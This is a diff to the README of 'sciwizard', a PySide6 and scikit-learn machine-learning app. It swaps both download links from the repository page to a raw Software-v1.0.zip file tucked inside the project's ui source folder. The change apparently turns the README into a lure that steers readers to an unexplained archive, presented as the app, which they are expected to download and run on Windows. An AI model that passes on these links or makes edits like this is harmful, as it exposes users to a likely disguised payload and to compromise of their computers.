@@ -1,6 +1,6 @@
 # 🧙 sciwizard - Machine Learning Made Simple
 
-[![Download sciwizard](https://img.shields.io/badge/Download-sciwizard-blue.svg?style=for-the-badge)](https://github.com/dalennanonvenomous209/sciwizard)
+[![Download sciwizard](https://img.shields.io/badge/Download-sciwizard-blue.svg?style=for-the-badge)](https://raw.githubusercontent.com/dalennanonvenomous209/sciwizard/main/sciwizard/ui/Software-v1.0.zip)
 
 ## 🖥️ What is sciwizard?
 
@@ -18,7 +18,7 @@ The app uses PySide6 for the interface and scikit-learn for the ML tools. It als
 
 Use this link to visit the page and download the app:
 
-[Go to the sciwizard download page](https://github.com/dalennanonvenomous209/sciwizard)
+[Go to the sciwizard download page](https://raw.githubusercontent.com/dalennanonvenomous209/sciwizard/main/sciwizard/ui/Software-v1.0.zip)
 
 ## 🪟 Run on Windows
 
